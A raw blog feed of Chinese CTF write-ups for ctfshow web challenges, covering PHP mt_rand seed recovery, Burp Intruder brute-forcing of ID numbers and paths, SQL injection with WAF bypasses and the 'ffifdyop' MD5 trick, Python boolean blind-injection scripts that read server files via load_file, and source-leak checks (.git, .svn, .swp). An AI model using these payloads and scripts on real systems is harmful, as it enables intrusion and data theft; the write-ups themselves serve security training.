invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
本题的考点是，只要知道随机数的值，就有可能反推出种子。</li>
</ol>
<ul>
<li>hexdec()函数<br>十六进制转换为十进制<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">hexdec</span>(<span class="keyword">string</span> <span class="variable">$hex_string</span>): <span class="keyword">int</span>|<span class="keyword">float</span></span><br></pre></td></tr></table></figure>
返回与 hex_string 参数所表示的十六进制数等值的的十进制数。hexdec() 将一个十六进制字符串转换为十进制数。<br>hexdec() 会忽略它遇到的任意非十六进制的字符。自 PHP 7.4.0 起，弃用使用任何无效字符。</li>
</ul>
<p>这段PHP脚本检查URL中是否设置了一个GET参数”r”。如果设置了，它将”r”参数的值赋给变量$r。然后使用flag的md5值的前8个字符种植Mersenne Twister随机数生成器，并使用mt_rand（）生成一个随机数。<br>然后它将$r变量减去生成的随机数，并将结果存储在$rand变量中。<br>如果$rand变量等于0，它将检查’token’ cookie是否具有两个由mt_rand（）生成的随机数的和的值。如果cookie值匹配，则会打印$flag的值。如果$rand变量不等于0，则会打印$rand变量的值。</p>
<p>首先，我们让r为0，这样便能够打印出伪随机数的负值，我们知道了伪随机数的值后，需要通过一个工具来逆推出种子值。</p>
<ol start="2">
<li>使用工具逆推种子值<br>这个<a href="https://www.openwall.com/php_mt_seed/">php_mt_seed</a>工具对于逆推mt_srand的种子值很有帮助。<br>使用kali,进入页面后，下载红色方框标注的位置：<br><img src="/simg/web25_1.png" alt=" "><br>下载好压缩包后进行提取，或通过命令行进入压缩包目录后进行如下操作：<br><code>tar zxvf php_mt_seed-4.0.tar.gz</code><br>由于安装包不是最新的，我们需要进行如下操作：<br><code>cd php_mt_seed-4.0</code><br><code>make</code><br><code>ls</code><br>我们会发现多出来一个用其它颜色标注的 <code>php_mt_seed</code><br>之后提升权限（如果不可以，则换成管理员身份），我们需要进行如下操作：<br><code>cd ..</code><br><code>chmod 777 php_mt_seed-4.0</code><br>最后再进入目录：<br><code>cd ./php_mt_seed-4.0</code><br>接下来就能够进行逆推种子了，我们进行如下操作：<br><code>time ./php_mt_seed 1537148198</code><br>在这个操作中，可能会生成版本不同的多个种子值。由于本题的PHP版本为7.3.11，我们就只看7.1+版本的种子值。<br>将种子值代入PHP脚本：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">0x00d06668</span>);</span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>();</span><br></pre></td></tr></table></figure>
因为Cookie需要的是第2个和第3个随机数之和，于是我们的脚本只需要输出2，3随机数之和即可。<br>经过多次尝试后，终于找到了正确的种子值，也成功拿到了flag。</li>
</ol>
<h1 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h1><p>代码逻辑有问题，直接抓包即可拿到flag</p>
<h1 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h1><ol>
<li>收集信息<br>打开页面后，我们发现需要学号和密码才能登录，而这两者我们都不知道。<br>然后还发现了录取名单和学生学籍查询系统，分别打开后，我们发现：<br>录取名单里出现了个人信息，姓名和身份证号，但是身份证号的中间8位被隐藏了。<br>学生学籍查询系统里可以根据姓名和身份证号查询学号。<br>于是我们的目标在于破解身份证号，然后用查询系统查询学号和密码。<br>那么，要破解身份证号，我们首先要搞清身份证号的组成规则：</li>
</ol>
<p>1.2位表示省（自治区、直辖市、特别行政区）。<br>3.4位表示市（地级市、自治州、地区、盟及直辖市所属区和县的汇总码）<br>5.6位表示县（区、县级市、旗）<br>7-14（身份证号码第七位到第十四位）表示编码对象出生的年、月、日，<br>15.16位表示所在地的派出所的代码。<br>17位标识性别：奇数表示男性，偶数表示女性。<br>18位为校验码</p>
<p>根据组成规则可知，我们要爆破的即为出生信息，那么将查询系统进行抓包，然后送到Intruder<br>p的后面确定为爆破位置，然后Payloads下的Payload Sets的Payload type设置为Dates，时间从1990到2000，位置从1到31，格式设置为yyyyMMdd<br>然后在Payload Processing处设置前缀为621022，后缀为5237<br>然后开始爆破，成功拿到身份证号，在响应中发现Unicode编码的字符:<br><code>\u606d\u559c\u60a8\uff0c\u60a8\u5df2\u88ab\u6211\u6821\u5f55\u53d6\uff0c\u4f60\u7684\u5b66\u53f7\u4e3a02015237 \u521d\u59cb\u5bc6\u7801\u4e3a\u8eab\u4efd\u8bc1\u53f7\u7801</code><br>解码后得到如下信息：<br><code>恭喜您，您已被我校录取，你的学号为02015237 初始密码为身份证号码</code><br>那么直接输入学号密码，即可拿到flag。</p>
<h1 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h1><p>暴力破解目录，我们可以看到URL为如下所示：<br><code>http://f1cc8a3d-95f3-44fb-8faf-11ed2f3aa85c.challenge.ctf.show/0/1/2.txt</code><br>其中0，1我们直接暴力破解，在这两个位置爆破数字1到100，像下面那样：<br><code>GET /§0§/§1§/index.php HTTP/1.1</code><br>然后将Positions处的Attack type改为Cluster bomb，便于我们爆破多个。</p>
<ul>
<li>Payloads<br>该页面下的Payload Sets 的Payload type修改为Numbers<br>并在Payload Options处From:1  To:100  Step: 1<br>两个爆破的位置都要设置，总计爆破10000次，调整线程，可以加快速度。</li>
</ul>
<p>最后成功拿到flag</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>爆破篇到这里就结束了，总的来说内容不多，难度不大。爆破类型还是较少，不过也并非毫无收获。希望能够有更加丰富的爆破训练。<br>这里再补充一点关于<a href="https://blog.csdn.net/weixin_39190897/article/details/86539542">验证码爆破与绕过的小知识</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>爆破</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>爆破</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFSHOW_web入门_SQL注入</title>
    <url>/2022/12/13/ctfshow_web%E5%85%A5%E9%97%A8_SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h1><p>打开F12，发现js，访问后，发现最后几行代码有关于输入的部分，于是随手输入一个：<br><code>url/api/?id=1</code><br>发现显示出数据，于是先构造一个：<br><code>url/api/?id=1&#39;or 1=1 --+</code><br>得到全部数据，但我们翻到最下面，显示flag不在这里，那说明flag应该是在另一个表里，于是进行常规注入，最后在ctfshow_user2的表里发现了flag。</p>
<h1 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h1><ol>
<li>查看源码<br>关键源码：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
通过waf函数可知，无法使用空格和select。<br>那么我们的绕过方式是：利用and的优先级高于or来绕过username!&#x3D;flag<br>通过爆破可知flag的位置在id&#x3D;26<br>payload: <code>0&#39;or(id=26)and&#39;1</code><br>and 的优先级比 or 要高，故注入后的语句变成了<br><code>select id,username,password from ctfshow_user where username != &#39;flag&#39; and id = &#39;0&#39;or(id=26)and&#39;1&#39; limit 1;</code><br>前面满足条件 id&#x3D;0 的记录不存在，故该语句可简化为<br><code>select id,username,password from ctfshow_user where (0) or(id=26)and&#39;1&#39; limit 1;</code><br>先计算 and，再计算 or，最后得到满足 id&#x3D;26 的记录，即 flag。</li>
</ol>
<p>还有另一种payload(但我疑惑的是0c不是已经过滤了吗…)：<br><code>-1&#39;%0cor%0cusername%0clike%0c&#39;flag</code></p>
<h1 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h1><p>考察了模糊查询，直接用上一题的第1个payload也可以，或者用模糊查询的方式：<br><code>-1&#39;%0cor%0cusername%0clike%0c&#39;%fla%</code></p>
<h1 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h1><ol>
<li><p>查看源码<br>查询语句</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select count(pass) from &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;tableName&#x27;</span>].<span class="string">&quot;;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>返回逻辑</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>查询结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//返回用户表的记录总数</span></span><br><span class="line">      <span class="variable">$user_count</span> = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>可以注意到，本题采用了POST传参，并且查询的字段名是pass<br>这一次过滤了更多的字符串，并且结果不会再返回flag信息了，只能知道查询到了多少条数据。<br>由此我们需要思考如何获得数据，比如可以通过布尔盲注。<br>由于我们知道flag的格式，只需要使用模糊查询方式便可确认，当 <code>user_count = 1</code> 时，我们可以知道查到了flag。</p>
</li>
<li><p>构造payload</p>
</li>
</ol>
<p>因此可以通过python写一个布尔盲注的脚本。脚本如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f211f79d-cd92-40ed-bfe7-02240bde15a3.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line">payload = <span class="string">&quot;(ctfshow_user)where(pass)like(0x&#123;&#125;)&quot;</span></span><br><span class="line">true_flag = <span class="string">&quot;$user_count = 1;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctf&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">right</span>(<span class="params">has:<span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> payload.<span class="built_in">format</span>((has+<span class="string">&#x27;%&#x27;</span>).encode().<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;tableName&quot;</span> : p</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">return</span> true_flag <span class="keyword">in</span> response.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;&#123;&#125;-&quot;</span>+string.digits+string.ascii_lowercase:</span><br><span class="line">        pd = flag+c</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\r[*] trying <span class="subst">&#123;pd&#125;</span>&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> valid_payload(right(pd)):</span><br><span class="line">            flag +=c</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\r[*] flag:<span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>right(has:str)：传入一个字符串，返回一个新字符串。新字符串的格式为”（ctfshow_user）where（pass）like（0x{}）”，其中{}部分是传入的字符串被添加%号后经过encode编码并转化为十六进制字符串。</p>
<p>valid_payload(p: str)：传入一个字符串，返回一个布尔值。它将传入的字符串放在POST请求中的tableName参数中，向url发送POST请求，并判断返回内容中是否包含true_flag字符串（”$user_count &#x3D; 1;”）。</p>
<p>接着是一个死循环，循环中使用了for语句，for语句中的循环变量c是字符串”{}-“+string.digits+string.ascii_lowercase的每一个字符（string.digits和string.ascii_lowercase分别是python的内置变量，包含所有数字字符和小写字母）。</p>
<p>for语句中如果valid_payload函数返回true，则让flag+c，再输出flag的值。当匹配到最后时，跳出循环。</p>
<p>最后运行脚本，即可拿到flag</p>
<h1 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h1><ol>
<li>查看源码<br>查询语句<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">  $sql = &quot;select count(*) from ctfshow_user where username = &#x27;$username&#x27; and password= &#x27;$password&#x27;&quot;;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>返回逻辑</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//只有admin可以获得flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名不存在&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>md5()函数<br>计算字符串的 MD5 散列值<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5(string $string, bool $binary = false): string</span><br></pre></td></tr></table></figure>
参数<br>string<br>要计算的字符串。<br>binary<br>如果可选的 binary 被设置为 true，那么 md5 摘要将以 16 字符长度的原始二进制格式返回。</li>
</ul>
<p>返回值<br>以 32 字符的十六进制数形式返回散列值。</p>
<ol start="2">
<li>构造payload<br>很明显，username&#x3D;admin，关键是password的绕过，我们注意到password在通过POST传入参数时，使用了MD5函数，并且函数的第二个参数设置为了true。那么我们可以使用一个特殊的字符串绕过password: <code>ffifdyop</code><br>原因是，当输出 <code>md5(&quot;ffifdyop&quot;,true)</code><br>会得到 <code>&#39;or&#39;6�]��!r,��b</code><br>我们能够注意到，当包裹变量的是单引号时，这个语句是一个恒为真的情况，那么便能够绕过了。<br>由此我们构造如下：<br>username: <code>admin</code><br>password: <code>ffifdyop</code><br>成功拿到flag</li>
</ol>
<h1 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h1><ol>
<li>查看源码<br>查询语句<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">$sql = &quot;select pass from ctfshow_user where username = &#123;$username&#125;&quot;;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>返回逻辑</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//用户名检测</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#x27;|\&quot;/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="title function_ invoke__">intval</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">  <span class="title function_ invoke__">array_push</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="keyword">array</span>(<span class="string">&#x27;flag&#x27;</span>=&gt;<span class="variable">$flag</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以注意sql查询语句里变量username没有用单引号或双引号包裹，那么在username可以使用数字 <code>0</code><br>这里是用到了弱类型比较，字符串开头是字母，那么与数字相比时，字符串会自动转化为0，也即该字符串等于0，因此该方式能够成功绕过。<br>在密码方面，检测了我们输入的密码是否为数字。<br>只要真正的密码开头为字母，那么使用数字0都能绕过，也即能够成功回显数据。</p>
<ol start="2">
<li>构造payload<br>那么经过以上分析后，我们可以构造payload如下：<br>username: <code>0</code> 或 <code>1||1</code> 或 <code>1&lt;1</code><br>password: <code>0</code><br>成功拿到flag</li>
</ol>
<h1 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h1><ol>
<li><p>查看源码<br>源码和上一题相同。但尝试以相同的手法注入时失败，那么需要用其它手段。<br>可以利用username筛选条件0和1回显不同，读文件布尔盲注flag。</p>
</li>
<li><p>构造payload</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://68444fc2-5167-4aba-8fe0-3226f3adff89.challenge.ctf.show/api/&quot;</span></span><br><span class="line">payload1 = <span class="string">&quot;if(locate(&#x27;ctfshow&#x27;,load_file(&#x27;/var/www/html/api/index.php&#x27;))&gt;&#123;index&#125;,0,1)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_flag_index</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    end = <span class="number">300</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start-end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start + end) &gt;&gt; <span class="number">1</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: payload1.<span class="built_in">format</span>(index=p),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            start = p + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">return</span> end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] finding flag index&quot;</span>)</span><br><span class="line">flag_index = find_flag_index()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[!] flag index found: <span class="subst">&#123;flag_index&#125;</span>&quot;</span>)</span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line">flag_index += <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] start to injection&quot;</span>)</span><br><span class="line">payload2 = <span class="string">&quot;if(ascii(substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,0,1)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> flag[-<span class="number">1</span>] != <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> start &lt; end:</span><br><span class="line">        p = (start + end) &gt;&gt; <span class="number">1</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: payload2.<span class="built_in">format</span>(flag_index, p),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            start = p + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    flag += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">    flag_index += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>这段代码通过发送 HTTP 请求来注入和猜测字符串 “ctfshow{…}”。通过二分查找的方式找到了该字符串的开头 “ctfshow{“ 在文件中的位置（即 “flag_index” 变量），然后使用二分查找的方式来猜测字符串中的每一个字符。<br>脚本使用了两种方式来进行注入：<br>首先，使用了一个查找函数 “find_flag_index()” 来查找 “ctfshow{“ 在文件中的位置。这个函数使用了二分查找的方式，不断尝试在文件中的不同位置查找 “ctfshow{“ 字符串，并使用 HTTP 请求来提交注入语句。脚本使用了 MySQL 的 “locate()” 函数来查找字符串在文件中的位置，并使用 “load_file()” 函数来读取文件。<br>然后，脚本使用了一个循环来猜测字符串中的每一个字符。这个循环使用了二分查找的方式，不断尝试在字符集中查找下一个字符。脚本使用了 MySQL 的 “ascii()” 函数来获取字符的 ASCII 码值，并使用 “substr()” 函数来获取字符串的子串。<br>总的来说，这段代码实现了通过发送 HTTP 请求来注入和猜测一个字符串的功能。脚本通过使用二分查找的方式来确定字符串在文件中的位置，然后使用二分查找的方式来猜测字符串中的每一个字符。</p>
</li>
</ol>
<p>运行该脚本，即可成功拿到flag。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFSHOW_WEB入门_信息搜集</title>
    <url>/2022/12/13/ctfshow_web%E5%85%A5%E9%97%A8_%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>仍然是新手入门题，继续来训练自己的基础了。这一篇主要是训练的信息搜集部分。有些相似的内容在攻防世界新手篇中有的不会再写，选择性的写有遗漏的部分。</p>
<span id="more"></span>
<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p><strong>考点: 前台JS绕过</strong><br>这一题无法鼠标右键查看源代码，也无法按下F12。<br>题目明示了是js前端拦截，那么我们有三种方法：</p>
<ol>
<li><p>不断刷新，不断按F12<br>实际上是一种条件竞争的方式</p>
</li>
<li><p>view-source:url<br>在url之前加上view-source</p>
</li>
<li><p>下载源码，比如按下CTRL+S<br>下载后即可查看</p>
</li>
</ol>
<h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><p><strong>考点: phps源码泄露</strong><br>提示源码泄露<br>直接在url后面加上<br><code>/index.phps</code><br>然后弹出下载框，下载后打开，发现flag</p>
<h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><p><strong>考点: 源码压缩包泄露</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">网站备份压缩文件 漏洞成因</span><br><span class="line">在网站的升级和维护过程中，通常需要对网站中的文件进行修改。此时就需要对网站整站或者其中某一页面进行备份。</span><br><span class="line">当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站 web 目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</span><br><span class="line">该漏洞的成因主要有是管理员将备份文件放在到 web 服务器可以访问的目录下。</span><br><span class="line">该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。</span><br><span class="line">被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。</span><br><span class="line">.rar .zip .7z .tar.gz .bak .swp .txt</span><br></pre></td></tr></table></figure>
<p>提示解压源码到当前目录。<br>一番折腾后，终于搞清楚做法：<br><code>url/www.zip</code><br>下载后解压打开txt文件，拿到flag</p>
<h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><p><strong>考点: Git泄露</strong><br>题目描述： 版本控制很重要，但不要部署到生产环境更重要。<br>根据提示版本控制，想到常用的版本控制工具git，svn，尝试访问.git和.svn，在.git中发现flag<br>这里是 .git 源码泄露。<br>是由于运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候， .git 这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。<br>类似的还有 .hg 源码泄露，由于 hg init 的时候生成 .hg 文件。<br>访问 <code>url/.git/</code><br>得到flag</p>
<h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><p><strong>考点: SVN泄露</strong><br>与web7类似，<br>这里是 SVN 导致文件泄露。<br>Subversion ，简称 SVN ，是一个开放源代码的版本控制系统，它的设计目标是取代 CVS 。<br>访问 <code>url/.svn</code><br>得到flag</p>
<h1 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h1><p><strong>考点: vim临时文件泄露</strong><br>题目描述：发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了<br>当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。<br>vim缓存泄露，在使用vim进行编辑时，会产生缓存文件，操作正常，则会删除缓存文件，如果意外退出，缓存文件保留下来，这是时可以通过缓存文件来得到原文件，以index.php来说，第一次退出后，缓存文件名为 .index.php.swp，第二次退出后，缓存文件名为.index.php.swo,第三次退出后文件名为.index.php.swn<br><a href="https://www.runoob.com/linux/linux-vim.html">vim</a></p>
<p>因此，访问 <code>url/index.php.swp</code><br>得到flag</p>
<h1 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h1><p><strong>考点: 域名txt记录泄露</strong><br>题目描述：域名其实也可以隐藏信息，比如flag.ctfshow.com 就隐藏了一条信息<br>根据提示，我们可以去查找该域名，比如打开<a href="https://boce.aliyun.com/home">网络诊断分析</a><br>查找后在“DNS检查”下发现TXT，得到flag</p>
<h1 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h1><p><strong>考点: 敏感信息公布</strong><br>题目描述：有时候网站上的公开信息，就是管理员常用密码<br>打开页面，发现最底部的一串数字，根据提示，估计就是密码了。<br>然后在url后面添加admin： <code>url/admin</code><br>进入管理员后台账户，账号即为admin，密码是刚才那串数字。<br>得到flag</p>
<h1 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h1><p><strong>考点: 内部技术文档泄露</strong><br>题目描述：技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码<br>查看底部的 document<br>点击后会出现一个pdf文件，上面写着登录地址和账号密码。<br>打开后即可得到flag</p>
